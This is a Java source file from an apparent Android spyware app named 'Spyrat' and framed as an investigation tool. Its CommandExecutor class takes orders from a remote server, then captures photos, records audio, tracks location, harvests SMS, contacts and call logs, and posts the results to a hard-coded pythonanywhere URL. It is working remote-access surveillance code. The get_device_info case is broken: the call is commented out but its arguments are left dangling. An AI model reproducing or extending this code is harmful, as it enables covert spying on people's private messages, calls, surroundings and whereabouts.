package com.spyrat.investigation;

import android.content.Context;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class CommandExecutor {
    private static final String TAG = "SpyratCommands";
    private static final String COMMAND_RESULT_URL = "https://GhostTester.pythonanywhere.com/api/investigator/command-result";

    public static void executeCommands(JSONArray commands, Context context) {
        try {
            for (int i = 0; i < commands.length(); i++) {
                JSONObject command = commands.getJSONObject(i);
                String commandType = command.getString("command_type");
                String commandId = command.getString("command_id");
                JSONObject parameters = command.optJSONObject("parameters");
                
                Log.d(TAG, "🎯 Executing: " + commandType + " (ID: " + commandId + ")");

                boolean success = false;
                String resultMessage = "";

                try {
                    switch (commandType) {
                        case "capture_photo":
                            CameraController.capturePhoto(context, parameters);
                            success = true;
                            resultMessage = "Photo capture initiated";
                            break;
                        case "record_audio":
                            AudioRecorder.startRecording(context, parameters);
                            success = true;
                            resultMessage = "Audio recording started";
                            break;
                        case "stop_audio":
                            AudioRecorder.stopRecording(context);
                            success = true;
                            resultMessage = "Audio recording stopped";
                            break;
                        case "get_location":
                            LocationTracker.sendCurrentLocation(context,
                                android.os.Build.SERIAL,
                                getInvestigatorCode(context));
                            success = true;
                            resultMessage = "Location data sent";
                            break;
                        case "get_sms":
                            SMSCapture.collectAndSendSMS(context,
                                android.os.Build.SERIAL,
                                getInvestigatorCode(context));
                            success = true;
                            resultMessage = "SMS data collection started";
                            break;
                        case "get_contacts":
                            ContactGrabber.collectAndSendContacts(context,
                                android.os.Build.SERIAL,
                                getInvestigatorCode(context));
                            success = true;
                            resultMessage = "Contacts data collection started";
                            break;
                        case "get_call_log":
                            CallMonitor.collectAndSendCalls(context,
                                android.os.Build.SERIAL,
                                getInvestigatorCode(context));
                            success = true;
                            resultMessage = "Call log collection started";
                            break;
                        case "get_device_info":
        // DeviceInfoCollector.sendDeviceInfo(context, deviceId, investigatorCode); // TEMP: Disabled for build
                                android.os.Build.SERIAL,
                                getInvestigatorCode(context));
                            success = true;
                            resultMessage = "Device info sent";
                            break;
                        default:
                            resultMessage = "Unknown command: " + commandType;
                            break;
                    }
                } catch (Exception e) {
                    resultMessage = "Command execution failed: " + e.getMessage();
                    Log.e(TAG, "❌ Command execution error: " + e.getMessage());
                }

                // Send command result back to server
                sendCommandResult(commandId, commandType, success, resultMessage, context);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Command execution error: " + e.getMessage());
        }
    }

    private static void sendCommandResult(String commandId, String commandType, boolean success, String message, Context context) {
        try {
            JSONObject resultData = new JSONObject();
            resultData.put("command_id", commandId);
            resultData.put("command_type", commandType);
            resultData.put("success", success);
            resultData.put("message", message);
            resultData.put("device_id", android.os.Build.SERIAL);
            resultData.put("investigator_code", getInvestigatorCode(context));
            resultData.put("timestamp", System.currentTimeMillis());

            String response = NetworkManager.sendPost(COMMAND_RESULT_URL, resultData.toString());
            if (response != null) {
                Log.d(TAG, "✅ Command result sent for: " + commandType);
            } else {
                Log.e(TAG, "❌ Failed to send command result");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Command result send error: " + e.getMessage());
        }
    }

    private static String getInvestigatorCode(Context context) {
        // In real implementation, get from shared preferences or config
        return "INVESTIGATOR_001";
    }
}
